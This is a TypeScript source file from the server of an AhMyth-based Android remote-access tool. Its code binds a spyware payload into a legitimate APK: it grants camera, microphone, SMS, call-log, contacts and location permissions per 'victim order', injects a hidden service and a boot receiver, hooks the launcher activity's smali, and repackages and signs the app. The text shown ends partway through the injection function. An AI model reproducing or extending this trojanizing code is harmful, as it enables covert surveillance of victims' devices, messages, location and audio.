import { exec } from 'child_process';
import { type Dirent } from 'fs';
import {
    copy,
    copyFile,
    mkdir,
    mkdtemp,
    readdir,
    readFile,
    rename,
    rmdir,
    unlink,
    writeFile,
} from 'fs-extra';
import { tmpdir } from 'os';
import { join, resolve } from 'path';
import readdirp from 'readdirp';
import Container from 'typedi';
import xml2js from 'xml2js';

import {
    BindingMethod,
    PackagingMode,
    PayloadLogStatus,
    PayloadStatus,
    ServerToWebEvents,
    VictimOrder,
} from '../../common/enums';
import {
    type IAndroidManifest,
    type IApplication,
    type IReceiver,
} from '../../common/interfaces';
import { config } from '../config';
import { type PayloadEntity, PayloadLogEntity } from '../entities';
import { logger } from '../logger';
import { SocketService } from '../services';

const apktoolJar = resolve(process.cwd(), config.APK_TOOL_PATH);
const signapkJar = resolve(process.cwd(), config.SIGN_APK_PATH);

const extractedPath = resolve(process.cwd(), config.APK_EXTRACTED_PATH);
const socketUrlFile = join(extractedPath, config.APK_SMALI_SOCKET_PATH);

const outputPath = resolve(process.cwd(), config.APK_OUTPUT_PATH);

const defaultPermissions: string[] = [
    'android.permission.WAKE_LOCK',
    'android.permission.CAMERA',
    'android.permission.READ_EXTERNAL_STORAGE',
    'android.permission.WRITE_EXTERNAL_STORAGE',
    'android.permission.MANAGE_EXTERNAL_STORAGE',
    'android.permission.WRITE_SETTINGS',
    'android.permission.WRITE_SECURE_SETTINGS',
    'android.permission.INTERNET',
    'android.permission.ACCESS_NETWORK_STATE',
    'android.permission.READ_SMS',
    'android.permission.SEND_SMS',
    'android.permission.RECEIVE_SMS',
    'android.permission.WRITE_SMS',
    'android.hardware.camera',
    'android.hardware.camera.autofocus',
    'android.permission.RECEIVE_BOOT_COMPLETED',
    'android.permission.READ_PHONE_STATE',
    'android.permission.READ_CALL_LOG',
    'android.permission.PROCESS_OUTGOING_CALLS',
    'android.permission.READ_CONTACTS',
    'android.permission.RECORD_AUDIO',
    'android.permission.MODIFY_AUDIO_SETTINGS',
    'android.permission.ACCESS_FINE_LOCATION',
    'android.permission.ACCESS_COARSE_LOCATION',
    'android.permission.ACCESS_BACKGROUND_LOCATION',
    'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
];

const orderPermissionMap: Record<VictimOrder, string[]> = {
    [VictimOrder.CAMERA]: [
        'android.permission.CAMERA',
        'android.hardware.camera',
        'android.hardware.camera.autofocus',
        'android.permission.WAKE_LOCK',
        'android.permission.WRITE_SETTINGS',
        'android.permission.WRITE_SECURE_SETTINGS',
        'android.permission.INTERNET',
        'android.permission.ACCESS_NETWORK_STATE',
        'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
        'android.permission.RECEIVE_BOOT_COMPLETED',
    ],
    [VictimOrder.FILE_MANAGER]: [
        'android.permission.READ_EXTERNAL_STORAGE',
        'android.permission.WRITE_EXTERNAL_STORAGE',
        'android.permission.MANAGE_EXTERNAL_STORAGE',
        'android.permission.WAKE_LOCK',
        'android.permission.WRITE_SETTINGS',
        'android.permission.WRITE_SECURE_SETTINGS',
        'android.permission.INTERNET',
        'android.permission.ACCESS_NETWORK_STATE',
        'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
        'android.permission.RECEIVE_BOOT_COMPLETED',
    ],
    [VictimOrder.MICROPHONE]: [
        'android.permission.RECORD_AUDIO',
        'android.permission.MODIFY_AUDIO_SETTINGS',
        'android.permission.WAKE_LOCK',
        'android.permission.WRITE_SETTINGS',
        'android.permission.WRITE_SECURE_SETTINGS',
        'android.permission.INTERNET',
        'android.permission.ACCESS_NETWORK_STATE',
        'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
        'android.permission.RECEIVE_BOOT_COMPLETED',
    ],
    [VictimOrder.LOCATION]: [
        'android.permission.ACCESS_FINE_LOCATION',
        'android.permission.ACCESS_COARSE_LOCATION',
        'android.permission.ACCESS_BACKGROUND_LOCATION',
        'android.permission.WAKE_LOCK',
        'android.permission.WRITE_SETTINGS',
        'android.permission.WRITE_SECURE_SETTINGS',
        'android.permission.INTERNET',
        'android.permission.ACCESS_NETWORK_STATE',
        'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
        'android.permission.RECEIVE_BOOT_COMPLETED',
    ],
    [VictimOrder.CONTACTS]: [
        'android.permission.READ_CONTACTS',
        'android.permission.WAKE_LOCK',
        'android.permission.WRITE_SETTINGS',
        'android.permission.WRITE_SECURE_SETTINGS',
        'android.permission.INTERNET',
        'android.permission.ACCESS_NETWORK_STATE',
        'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
        'android.permission.RECEIVE_BOOT_COMPLETED',
    ],
    [VictimOrder.SMS]: [
        'android.permission.READ_SMS',
        'android.permission.SEND_SMS',
        'android.permission.RECEIVE_SMS',
        'android.permission.WRITE_SMS',
        'android.permission.WAKE_LOCK',
        'android.permission.WRITE_SETTINGS',
        'android.permission.WRITE_SECURE_SETTINGS',
        'android.permission.INTERNET',
        'android.permission.ACCESS_NETWORK_STATE',
        'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
        'android.permission.RECEIVE_BOOT_COMPLETED',
    ],
    [VictimOrder.CALLS]: [
        'android.permission.READ_PHONE_STATE',
        'android.permission.READ_CALL_LOG',
        'android.permission.PROCESS_OUTGOING_CALLS',
        'android.permission.WAKE_LOCK',
        'android.permission.WRITE_SETTINGS',
        'android.permission.WRITE_SECURE_SETTINGS',
        'android.permission.INTERNET',
        'android.permission.ACCESS_NETWORK_STATE',
        'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
        'android.permission.RECEIVE_BOOT_COMPLETED',
    ],
};

let socketService: SocketService | null = null;

const getSocketService = (): SocketService => {
    if (!socketService) {
        socketService = Container.get(SocketService);
    }

    return socketService;
};

const payloadSucceeded = async (payload: PayloadEntity): Promise<void> => {
    payload.status = PayloadStatus.SUCCESS;
    await payload.save();

    getSocketService().payloadsRoom.emit(
        ServerToWebEvents.PAYLOAD_UPDATED,
        payload,
    );
};

const execStage = async <T>(
    payload: PayloadEntity,
    message: string,
    callback: (
        updateStatus: (
            status: PayloadLogStatus,
            error?: string,
        ) => Promise<void>,
    ) => T | Promise<T>,
): Promise<T> => {
    const log = new PayloadLogEntity(message, payload);

    await log.save();

    getSocketService().payloadsRoom.emit(
        ServerToWebEvents.PAYLOAD_LOG_ADDED,
        log,
    );

    if (!payload.logs) payload.logs = [];

    payload.logs.push(log);

    const updateStatus = async (
        status: PayloadLogStatus,
        error?: string,
    ): Promise<void> => {
        log.status = status;
        log.error = error;
        await log.save();

        if (status === PayloadLogStatus.FAILED) {
            payload.status = PayloadStatus.FAILED;
            await payload.save();

            getSocketService().payloadsRoom.emit(
                ServerToWebEvents.PAYLOAD_UPDATED,
                payload,
            );
        } else {
            getSocketService().payloadsRoom.emit(
                ServerToWebEvents.PAYLOAD_LOG_UPDATED,
                log,
            );
        }
    };

    return await callback(updateStatus);
};

const execCommand = async (
    command: string,
): Promise<{ stdout: string; stderr: string }> => {
    logger.verbose(`Executing Command: ${command}`, {
        label: 'payload',
        action: 'exec-command',
    });

    return await new Promise((resolve, reject) => {
        exec(command, (error, stdout, stderr) => {
            if (error !== null) {
                logger.debug('Command Execution Failed!', {
                    label: 'payload',
                    action: 'exec-command',
                    stdout,
                    stderr,
                    error,
                });
                reject(error);
            }

            logger.debug('Command Execution Successful!', {
                label: 'payload',
                action: 'exec-command',
                stdout,
                stderr,
            });

            resolve({ stdout, stderr });
        });
    });
};

const checkJavaVersion = async (): Promise<number> => {
    logger.verbose('Checking Java Version...', {
        label: 'payload',
        action: 'generate-apk',
    });

    return await new Promise((resolve, reject) => {
        exec('java -version', (error, stdout, stderr) => {
            if (error !== null) {
                reject(new Error('Java is not installed or not accessible.'));
            } else {
                const versionOutput = stderr ?? stdout;
                const versionMatch = versionOutput.match(
                    /version "(\d+)\.(\d+)\.|version "(\d+)-internal"/,
                );

                if (versionMatch !== null) {
                    const majorVersion = parseInt(
                        versionMatch[1] ?? versionMatch[3],
                        10,
                    );
                    resolve(majorVersion);
                } else {
                    reject(
                        new Error('Java is not installed or not accessible.'),
                    );
                }
            }
        });
    });
};

const getSelectedPermissions = (payload: PayloadEntity): string[] =>
    payload.permissions.length === 0 ||
    payload.permissions.length === Object.values(VictimOrder).length
        ? defaultPermissions
        : payload.permissions
              .reduce<string[]>((permissions, order) => {
                  return permissions.concat(orderPermissionMap[order]);
              }, [])
              .filter((item, index, array) => array.indexOf(item) === index);

const generateApk = async (
    payload: PayloadEntity,
    apkFolder: string,
): Promise<void> => {
    await execStage(
        payload,
        "Cleaning up apktool's framework directory...",
        async (updateStatus) => {
            try {
                logger.verbose('Emptying the Apktool Framework Directory...', {
                    label: 'payload',
                    action: 'generate-apk',
                });

                await execCommand(
                    `java -jar "${apktoolJar}" empty-framework-dir --force`,
                );
            } catch (error) {
                // Ignore the error by doing nothing
            }

            await updateStatus(PayloadLogStatus.SUCCESS);
        },
    );

    const unsignedApkPath = join(outputPath, `${payload.id}-unsigned.apk`);
    const signedApkRawPath = join(
        outputPath,
        `${payload.id}-aligned-debugSigned.apk`,
    );
    const signedApkPath = join(outputPath, `${payload.id}.apk`);

    const repackApkResult = await execStage<boolean>(
        payload,
        "Repacking the APK using 'apktool'...",
        async (updateStatus) => {
            logger.verbose(`Repacking the APK to ${unsignedApkPath}...`, {
                label: 'payload',
                action: 'generate-apk',
            });

            const createApk = `java -jar "${apktoolJar}" b "${apkFolder}" -o "${unsignedApkPath}" --use-aapt2`;

            try {
                await execCommand(createApk);

                await updateStatus(PayloadLogStatus.SUCCESS);

                return true;
            } catch (error) {
                logger.error('Failed to pack APK using apktool!', {
                    label: 'payload',
                    action: 'generate-apk',
                    error,
                });

                await updateStatus(
                    PayloadLogStatus.FAILED,
                    'Failed to pack APK using apktool. Please try again.',
                );

                return false;
            }
        },
    );

    if (!repackApkResult) return;

    const signApkResult = await execStage<boolean>(
        payload,
        "Signing the APK using 'signapk'...",
        async (updateStatus) => {
            logger.verbose(`Signing ${unsignedApkPath}...`, {
                label: 'payload',
                action: 'generate-apk',
            });

            const signApk = `java -jar "${signapkJar}" -a "${unsignedApkPath}"`;

            try {
                await execCommand(signApk);

                await updateStatus(PayloadLogStatus.SUCCESS);

                return true;
            } catch (error) {
                logger.error('Failed to sign apk using signapk!', {
                    label: 'payload',
                    action: 'generate-apk',
                    error,
                });

                await updateStatus(
                    PayloadLogStatus.FAILED,
                    'Failed to sign apk using signapk.jar. Please try again.',
                );

                return false;
            }
        },
    );

    if (!signApkResult) return;

    const renameApkResult = await execStage<boolean>(
        payload,
        'Renaming the signed APK...',
        async (updateStatus) => {
            logger.verbose('Renaming the signed APK...', {
                label: 'payload',
                action: 'generate-apk',
            });

            try {
                await rename(signedApkRawPath, signedApkPath);
                await updateStatus(PayloadLogStatus.SUCCESS);

                return true;
            } catch (error) {
                logger.error('Failed to rename the signed APK!', {
                    label: 'payload',
                    action: 'generate-apk',
                    error,
                });

                await updateStatus(
                    PayloadLogStatus.FAILED,
                    'Failed to rename the signed APK. Please try again.',
                );

                return false;
            }
        },
    );

    if (!renameApkResult) return;

    await execStage(payload, 'Cleaning up...', async (updateStatus) => {
        try {
            await unlink(unsignedApkPath);
        } catch (error) {
            logger.warn('Failed to delete unsigned apk!', {
                label: 'payload',
                action: 'generate-apk',
                error,
            });
        }

        try {
            logger.verbose(
                'Restoring the Original AndroidManifest.xml File...',
                {
                    label: 'payload',
                    action: 'generate-apk',
                },
            );

            await copyFile(
                join(config.APK_EXTRACTED_PATH, 'AndroidManifest-Backup.xml'),
                join(config.APK_EXTRACTED_PATH, 'AndroidManifest.xml'),
            );
        } catch (error) {
            logger.error(
                "Failed to restore the original 'AndroidManifest.xml'!",
                {
                    label: 'payload',
                    action: 'generate-apk',
                    error,
                },
            );
        }

        await updateStatus(PayloadLogStatus.SUCCESS);
    });

    logger.info(`Payload Built Successfully. APK stored at: ${signedApkPath}`, {
        label: 'payload',
        action: 'generate-apk',
    });

    await payloadSucceeded(payload);
};

const modifyManifest = async (
    payload: PayloadEntity,
    data: string,
): Promise<string | null> => {
    const selectedPermissions = await execStage(
        payload,
        'Building permissions list...',
        async (updateStatus) => {
            const permissions = getSelectedPermissions(payload);

            await updateStatus(PayloadLogStatus.SUCCESS);

            return permissions;
        },
    );

    logger.verbose('Parsing the Android Manifest XML Data...', {
        label: 'payload',
        action: 'generate-apk',
    });

    const targetManifest = await execStage<IAndroidManifest | null>(
        payload,
        "Parsing target APK's manifest...",
        async (updateStatus) => {
            try {
                const result = await xml2js.parseStringPromise(data, {
                    explicitArray: false,
                });

                await updateStatus(PayloadLogStatus.SUCCESS);

                return result;
            } catch (error) {
                logger.error("Failed to parse target APK's manifest!", {
                    label: 'payload',
                    action: 'generate-apk',
                    error,
                });

                await updateStatus(
                    PayloadLogStatus.FAILED,
                    "Failed to parse target APK's manifest. Please try again.",
                );

                return null;
            }
        },
    );

    if (!targetManifest) return null;

    return await execStage<string | null>(
        payload,
        "Updating target APK's manifest...",
        async (updateStatus) => {
            try {
                const manifestObj = targetManifest.manifest;

                const application = Array.isArray(manifestObj.application)
                    ? manifestObj.application[0]
                    : (manifestObj.application as IApplication);

                // Check if receiver and service properties are arrays
                if (!Array.isArray(application.receiver)) {
                    application.receiver = application.receiver
                        ? [application.receiver]
                        : [];
                }

                if (!Array.isArray(application.service)) {
                    application.service = application.service
                        ? [application.service]
                        : [];
                }

                // store existing permissions
                const existingPermissions = new Set();

                // Check if permissions already exist in the manifest
                if (manifestObj['uses-permission']) {
                    if (!Array.isArray(manifestObj['uses-permission'])) {
                        manifestObj['uses-permission'] = [
                            manifestObj['uses-permission'],
                        ];
                    }
                    manifestObj['uses-permission'].forEach((permission) => {
                        existingPermissions.add(permission.$['android:name']);
                    });
                } else {
                    manifestObj['uses-permission'] = [];
                }

                // Check if features already exist in the manifest
                if (manifestObj['uses-feature']) {
                    if (!Array.isArray(manifestObj['uses-feature'])) {
                        manifestObj['uses-feature'] = [
                            manifestObj['uses-feature'],
                        ];
                    }
                    manifestObj['uses-feature'].forEach((feature) => {
                        existingPermissions.add(feature.$['android:name']);
                    });
                } else {
                    manifestObj['uses-feature'] = [];
                }

                // Filter selected permissions to exclude duplicates
                const filteredPermissions = selectedPermissions.filter(
                    (permission, index, self) => {
                        return (
                            self.indexOf(permission) === index &&
                            !existingPermissions.has(permission)
                        );
                    },
                );

                logger.verbose('Injecting AhMyth Payload Permissions...', {
                    label: 'payload',
                    action: 'generate-apk',
                });

                // Add new permissions and features based on filteredPermissions
                filteredPermissions.forEach((permission) => {
                    if (permission === 'android.hardware.camera') {
                        manifestObj['uses-feature'].push({
                            $: {
                                'android:name': 'android.hardware.camera',
                            },
                        });
                    }

                    if (permission === 'android.hardware.camera.autofocus') {
                        manifestObj['uses-feature'].push({
                            $: {
                                'android:name':
                                    'android.hardware.camera.autofocus',
                            },
                        });
                    }

                    if (
                        permission !== 'android.hardware.camera' &&
                        permission !== 'android.hardware.camera.autofocus'
                    ) {
                        manifestObj['uses-permission'].push({
                            $: {
                                'android:name': permission,
                            },
                        });
                    }
                });

                logger.verbose(
                    'Injecting AhMyth Payload Service and Receiver...',
                    {
                        label: 'payload',
                        action: 'generate-apk',
                    },
                );

                // Construct the receiver and service tags using constants
                const receiverTag: IReceiver = {
                    $: {
                        'android:enabled': 'true',
                        'android:exported': 'true',
                        'android:name': config.APK_MAIN_RECEIVER,
                    },
                    'intent-filter': {
                        action: {
                            $: {
                                'android:name':
                                    'android.intent.action.BOOT_COMPLETED',
                            },
                        },
                    },
                };

                const serviceTag = {
                    $: {
                        'android:enabled': 'true',
                        'android:exported': 'false',
                        'android:name': config.APK_MAIN_SERVICE,
                    },
                };

                // Add the receiver and service tags to the application node
                application.receiver.push(receiverTag);
                application.service.push(serviceTag);

                const builder = new xml2js.Builder({
                    renderOpts: {
                        pretty: true,
                        indent: '    ',
                    },
                    headless: true,
                });

                // Modify the parsed object by finding and updating the closing application tag
                const closingAppTag = '</application>';
                const modifiedClosingAppTag = '\n  </application>';
                const xmlString = builder.buildObject(targetManifest);
                const modifiedXml = xmlString.replace(
                    closingAppTag,
                    modifiedClosingAppTag,
                );

                // Find the closing manifest tag and replace it with a new closing tag (without the extra newline)
                const closingManifestTag = '</manifest>';
                const finalModifiedXml = modifiedXml.replace(
                    closingManifestTag,
                    '</manifest>',
                );

                await updateStatus(PayloadLogStatus.SUCCESS);

                return finalModifiedXml;
            } catch (error) {
                logger.error("Failed to update target APK's manifest!", {
                    label: 'payload',
                    action: 'generate-apk',
                    error,
                });

                await updateStatus(
                    PayloadLogStatus.FAILED,
                    "Failed to update target APK's manifest. Please try again.",
                );

                return null;
            }
        },
    );
};

const getLauncherActivity = async (
    payload: PayloadEntity,
    manifest: IAndroidManifest,
): Promise<string | null> => {
    return await execStage<string | null>(
        payload,
        "Finding the launcher activity in target APK's manifest...",
        async (updateStatus) => {
            logger.verbose(
                'Searching for a hookable class activity in the modified manifest...',
                {
                    label: 'payload',
                    action: 'generate-apk',
                },
            );

            const application = manifest.manifest.application[0];

            let mainApplicationClassName: string | undefined =
                application?.$?.['android:name'];

            if (
                mainApplicationClassName &&
                !mainApplicationClassName.startsWith('android.app')
            ) {
                mainApplicationClassName = mainApplicationClassName
                    .split('.')
                    .pop();

                if (
                    mainApplicationClassName &&
                    mainApplicationClassName.startsWith('.')
                ) {
                    mainApplicationClassName =
                        mainApplicationClassName.slice(1);
                }

                logger.verbose('Scoped the main app class for hooking...', {
                    label: 'payload',
                    action: 'generate-apk',
                    mainApplicationClassName,
                });

                await updateStatus(PayloadLogStatus.SUCCESS);

                return mainApplicationClassName + '.smali';
            }

            const activity = application?.activity?.find((activity) => {
                const intentFilter = activity['intent-filter'];
                if (intentFilter) {
                    return intentFilter.some(
                        (filter) =>
                            filter.action?.some(
                                (action) =>
                                    action.$['android:name'] ===
                                    'android.intent.action.MAIN',
                            ) &&
                            filter.category?.some(
                                (category) =>
                                    category.$['android:name'] ===
                                        'android.intent.category.LAUNCHER' ||
                                    category.$['android:name'] ===
                                        'android.intent.category.DEFAULT',
                            ),
                    );
                }

                return false;
            });

            if (activity) {
                let mainActivityClassName: string | undefined =
                    activity.$?.['android:name'];

                if (
                    mainActivityClassName &&
                    !mainActivityClassName.startsWith('android.app')
                ) {
                    mainActivityClassName = mainActivityClassName
                        .split('.')
                        .pop();
                    if (
                        mainActivityClassName &&
                        mainActivityClassName.startsWith('.')
                    ) {
                        mainActivityClassName = mainActivityClassName.slice(1);
                    }

                    logger.verbose(
                        'Scoped the main launcher activity class for hooking...',
                        {
                            label: 'payload',
                            action: 'generate-apk',
                            mainActivityClassName,
                        },
                    );

                    await updateStatus(PayloadLogStatus.SUCCESS);

                    return mainActivityClassName + '.smali';
                }
            }

            const activityAlias = application?.['activity-alias']?.find(
                (activityAlias) => {
                    const intentFilter = activityAlias['intent-filter'];
                    if (intentFilter) {
                        return intentFilter.some(
                            (filter) =>
                                filter.action?.some(
                                    (action) =>
                                        action.$['android:name'] ===
                                        'android.intent.action.MAIN',
                                ) &&
                                filter.category?.some(
                                    (category) =>
                                        category.$['android:name'] ===
                                            'android.intent.category.LAUNCHER' ||
                                        category.$['android:name'] ===
                                            'android.intent.category.DEFAULT',
                                ),
                        );
                    }
                    return false;
                },
            );

            if (activityAlias) {
                let targetActivityName: string | undefined =
                    activityAlias.$?.['android:targetActivity'];
                targetActivityName = targetActivityName.split('.').pop();
                if (targetActivityName && targetActivityName.startsWith('.')) {
                    targetActivityName = targetActivityName.slice(1);
                }

                logger.verbose(
                    'Scoped the main launcher activity class in an alias for hooking...',
                    {
                        label: 'payload',
                        action: 'generate-apk',
                        targetActivityName,
                    },
                );

                await updateStatus(PayloadLogStatus.SUCCESS);

                return targetActivityName + '.smali';
            }

            logger.error('Failed to find launcher activity in manifest!', {
                label: 'payload',
                action: 'generate-apk',
            });

            await updateStatus(
                PayloadLogStatus.FAILED,
                'Failed to find suitable launcher activity in manifest. Please try again.',
            );

            return null;
        },
    );
};

const getLauncherPath = async (
    payload: PayloadEntity,
    launcherActivity: string,
    apkFolder: string,
): Promise<string | null> => {
    return await execStage<string | null>(
        payload,
        "Finding the launcher activity's smali file...",
        async (updateStatus) => {
            try {
                for await (const entry of readdirp(apkFolder, {
                    fileFilter: launcherActivity,
                    alwaysStat: true,
                })) {
                    if (entry.path) {
                        const output = JSON.stringify(entry.path)
                            .replace(/^"(.*)"$/, '$1')
                            .replace(/\n$/, '');

                        await updateStatus(PayloadLogStatus.SUCCESS);

                        return output;
                    }
                }
            } catch (error) {
                logger.error('Failed to find launcher activity smali!', {
                    label: 'payload',
                    action: 'generate-apk',
                    error,
                });
            }

            await updateStatus(
                PayloadLogStatus.FAILED,
                'Failed to find launcher activity smali. Please try again or choose `On Boot` bind method.',
            );

            return null;
        },
    );
};

const createPayloadDirectory = (files: Dirent[]): string | null => {
    const ignoreDirs = [
        'original',
        'res',
        'build',
        'kotlin',
        'lib',
        'assets',
        'META-INF',
        'unknown',
        'smali_assets',
    ];

    const collator = new Intl.Collator([], {
        numeric: true,
    });

    const smaliList = files
        .filter((item) => item.isDirectory() && !ignoreDirs.includes(item.name))
        .map((item) => item.name)
        .sort((a, b) => collator.compare(a, b));

    const lastSmali = smaliList[smaliList.length - 1];

    if (lastSmali === 'smali') {
        return '/smali_classes2';
    } else {
        const extractSmaliNumber = lastSmali.match(/[a-zA-Z_]+|[0-9]+/g);

        if (extractSmaliNumber) {
            const lastSmaliNumber = parseInt(extractSmaliNumber[1]);
            const newSmaliNumber = lastSmaliNumber + 1;
            return `/smali_classes${newSmaliNumber}`;
        }
    }

    return null;
};

const injectAhmythFilesAndGenerateApk = async (
    payload: PayloadEntity,
    apkFolder: string,
): Promise<void> => {
    const targetFiles = await execStage<Dirent[] | null>(
        payload,
        'Listing decompiled files from target APK...',
        async (updateStatus) => {
            try {
                logger.verbose(
                    `Listing decompiled files from ${apkFolder}...`,
                    {
                        label: 'payload',
                        action: 'generate-apk',
                    },
                );

                const files = await readdir(apkFolder, {
                    withFileTypes: true,
                });

                await updateStatus(PayloadLogStatus.SUCCESS);

                return files;
            } catch (error) {
                logger.error(
                    `Failed to list decompiled files from ${apkFolder}!`,
                    {
                        label: 'payload',
                        action: 'generate-apk',
                        error,
                    },
                );

                await updateStatus(
                    PayloadLogStatus.FAILED,
                    `Failed to list decompiled files!. Please try again.`,
                );

                return null;
            }
        },
    );

    if (!targetFiles) return;

    const targetPayloadFolder = await execStage<string | null>(
        payload,
        'Finding the target payload folder...',
        async (updateStatus) => {
            try {
                const payloadSmaliFolder = createPayloadDirectory(targetFiles);

                if (payloadSmaliFolder === null) {
                    logger.error(
                        'Failed to determine new smali folder for payload!',
                        {
                            label: 'payload',
                            action: 'generate-apk',
                        },
                    );

                    await updateStatus(
                        PayloadLogStatus.FAILED,
                        'Failed to determine new smali folder for payload. Please try again.',
                    );

                    return null;
                }

                const targetPayloadFolder = join(apkFolder, payloadSmaliFolder);

                await updateStatus(PayloadLogStatus.SUCCESS);

                return targetPayloadFolder;
            } catch (error) {
                logger.error(`Failed to find the target payload folder!`, {
                    label: 'payload',
                    action: 'generate-apk',
                    error,
                });

                await updateStatus(
                    PayloadLogStatus.FAILED,
                    `Failed to find the target payload folder!. Please try again.`,
                );

                return null;
            }
        },
    );

    if (!targetPayloadFolder) return;

    const createFolderResult = await execStage<boolean>(
        payload,
        'Creating the target payload folder...',
        async (updateStatus) => {
            logger.verbose(
                `Creating the target payload folder at '${targetPayloadFolder}'`,
                {
                    label: 'payload',
                    action: 'generate-apk',
                },
            );

            try {
                await mkdir(targetPayloadFolder, {
                    recursive: true,
                });

                await updateStatus(PayloadLogStatus.SUCCESS);

                return true;
            } catch (error) {
                logger.error(
                    `Failed to create the ${targetPayloadFolder} directory!`,
                    {
                        label: 'payload',
                        action: 'generate-apk',
                        error,
                    },
                );

                await updateStatus(
                    PayloadLogStatus.FAILED,
                    `Failed to create the target payload directory. Please try again.`,
                );

                return false;
            }
        },
    );

    if (!createFolderResult) return;

    const copyFilesResult = await execStage<boolean>(
        payload,
        'Copying the payload files to the target payload folder...',
        async (updateStatus) => {
            try {
                logger.verbose(
                    `Copying the payload files to the ${targetPayloadFolder} directory...`,
                    {
                        label: 'payload',
                        action: 'generate-apk',
                    },
                );

                await copy(
                    join(config.APK_EXTRACTED_PATH, 'smali'),
                    targetPayloadFolder,
                    {
                        overwrite: true,
                    },
                );

                await copy(
                    join(targetPayloadFolder, 'android'),
                    join(apkFolder, 'smali', 'android'),
                    {
                        overwrite: true,
                    },
                );

                await copy(
                    join(targetPayloadFolder, 'androidx'),
                    join(apkFolder, 'smali', 'androidx'),
                    {
                        overwrite: true,
                    },
                );

                await updateStatus(PayloadLogStatus.SUCCESS);

                return true;
            } catch (error) {
                logger.error(
                    `Failed to copy payload files to the ${targetPayloadFolder} directory!`,
                    {
                        label: 'payload',
                        action: 'generate-apk',
                        error,
                    },
                );

                await updateStatus(
                    PayloadLogStatus.FAILED,
                    `Failed to copy payload files to the target payload directory. Please try again.`,
                );

                return false;
            }
        },
    );

    if (!copyFilesResult) return;

    const rmDirResult = await execStage<boolean>(
        payload,
        "Removing original 'android' and 'androidx' folders...",
        async (updateStatus) => {
            try {
                logger.verbose(
                    `Removing original 'android' and 'androidx' folders from ${targetPayloadFolder}...`,
                    {
                        label: 'payload',
                        action: 'generate-apk',
                    },
                );

                // Remove the original 'android' and 'androidx' directories (CHANGE TO 'fs.rmDir' of problems arise)
                await rmdir(join(targetPayloadFolder, 'android'), {
                    recursive: true,
                });

                await rmdir(join(targetPayloadFolder, 'androidx'), {
                    recursive: true,
                });

                await updateStatus(PayloadLogStatus.SUCCESS);

                return true;
            } catch (error) {
                logger.error(
                    "Failed to remove original 'android' and 'androidx' folders from payload directory!",
                    {
                        label: 'payload',
                        action: 'generate-apk',
                        error,
                    },
                );

                await updateStatus(
                    PayloadLogStatus.FAILED,
                    "Failed to remove original 'android' and 'androidx' folders from payload directory. Please try again.",
                );

                return false;
            }
        },
    );

    if (!rmDirResult) return;

    await generateApk(payload, apkFolder);
};

const bindOnBoot = async (
    payload: PayloadEntity,
    apkFolder: string,
    modifiedXml: string,
): Promise<void> => {
    const targetManifestPath = join(apkFolder, 'AndroidManifest.xml');

    const writeManifestResult = await execStage<boolean>(
        payload,
        "Writing modified manifest to target APK's manifest...",
        async (updateStatus) => {
            try {
                logger.verbose(
                    `Writing modified manifest to target APK's manifest...`,
                    {
                        label: 'payload',
                        action: 'generate-apk',
                    },
                );

                await writeFile(targetManifestPath, modifiedXml, 'utf8');

                await updateStatus(PayloadLogStatus.SUCCESS);

                return true;
            } catch (error) {
                logger.error(
                    `Failed to write modified manifest to target APK's manifest!`,
                    {
                        label: 'payload',
                        action: 'generate-apk',
                        error,
                    },
                );

                await updateStatus(
                    PayloadLogStatus.FAILED,
                    "Failed to write modified manifest to target APK's manifest! Please try again.",
                );

                return false;
            }
        },
    );

    if (!writeManifestResult) return;

    await injectAhmythFilesAndGenerateApk(payload, apkFolder);
};

const bindOnActivity = async (
    payload: PayloadEntity,
    apkFolder: string,
    modifiedXml: string,
): Promise<void> => {
    const manifest = await execStage<IAndroidManifest | null>(
        payload,
        'Parsing modified manifest to find the launcher activity...',
        async (updateStatus) => {
            try {
                logger.verbose(
                    `Parsing modified manifest to find the launcher activity...`,
                    {
                        label: 'payload',
                        action: 'generate-apk',
                    },
                );

                const result = await xml2js.parseStringPromise(modifiedXml, {
                    explicitArray: false,
                });

                await updateStatus(PayloadLogStatus.SUCCESS);

                return result;
            } catch (error) {
                logger.error(
                    `Failed to parse modified manifest to find the launcher activity!`,
                    {
                        label: 'payload',
                        action: 'generate-apk',
                        error,
                    },
                );

                await updateStatus(
                    PayloadLogStatus.FAILED,
                    'Failed to parse modified manifest to find the launcher activity! Please try again.',
                );

                return null;
            }
        },
    );

    if (!manifest) return;

    const launcherActivity = await getLauncherActivity(payload, manifest);

    if (!launcherActivity) return;

    logger.verbose('Locating the Main Class Smali File...', {
        label: 'payload',
        action: 'generate-apk',
    });

    const launcherPath = await getLauncherPath(
        payload,
        launcherActivity,
        apkFolder,
    );

    if (!launcherPath) return;

    const launchActivityCode = await execStage<string | null>(
        payload,
        "Reading launcher activity's smali file...",
        async (updateStatus) => {
            try {
                logger.verbose(`Reading launcher activity's smali file...`, {
                    label: 'payload',
                    action: 'generate-apk',
                });

                const launchActivityCode = await readFile(
                    join(apkFolder, launcherPath),
                    'utf8',
                );

                await updateStatus(PayloadLogStatus.SUCCESS);

                return launchActivityCode;
            } catch (error) {
                logger.error(`Failed to read launcher activity's smali file!`, {
                    label: 'payload',
                    action: 'generate-apk',
                    error,
                });

                await updateStatus(
                    PayloadLogStatus.FAILED,
                    "Failed to read launcher activity's smali file! Please try again.",
                );

                return null;
            }
        },
    );

    if (!launchActivityCode) return;

    const updatedLaunchActivityCode = await execStage<string | null>(
        payload,
        "Injecting payload into launcher activity's smali file...",
        async (updateStatus) => {
            try {
                logger.verbose(
                    `Injecting payload into launcher activity's smali file...`,
                    {
                        label: 'payload',
                        action: 'generate-apk',
                    },
                );

                const output = launchActivityCode.replace(
                    config.APK_SMALI_SERVICE_HOOK_POINT,
                    config.APK_SMALI_SERVICE_INJECT,
                );

                await updateStatus(PayloadLogStatus.SUCCESS);

                return output;
            } catch (error) {
                logger.error(
                    `Failed to inject payload into launcher activity's smali file!`,
                    {
                        label: 'payload',
                        action: 'generate-apk',
                        error,
                    },
                );

                await updateStatus(
                    PayloadLogStatus.FAILED,
                    "Failed to inject payload into launcher activity's smali file! Please try again.",
                );

                return null;
            }
        },
    );

